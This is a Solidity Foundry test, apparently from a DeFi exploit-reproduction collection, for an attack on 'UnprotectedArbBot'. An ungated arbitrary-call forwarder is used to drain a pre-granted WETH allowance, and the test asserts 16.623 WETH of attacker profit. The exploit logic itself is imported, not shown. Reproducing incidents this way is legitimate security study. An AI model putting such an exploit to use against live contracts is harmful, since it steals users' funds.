// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Exploit, ArbBot, WETH9, OwnerWallet} from "./2026-07-UnprotectedArbBot.sol";

// UnprotectedArbBot (Base, 2026-07). An ungated arbitrary-call forwarder sweeps
// a pre-granted WETH allowance from an owner EOA to the attacker.
contract UnprotectedArbBotTest is Test {
    function test_exploit_ungatedForwarder_drainsPreGrantedAllowance() public {
        Exploit e = new Exploit();
        e.run();
        emit log_named_decimal_uint("WETH drained from owner", e.drained(), 18);
        emit log_named_decimal_uint("attacker WETH profit", e.profit(), 18);
        assertEq(e.profit(), 16623029776956898128, "must drain the pre-granted 16.623 WETH");
    }
}
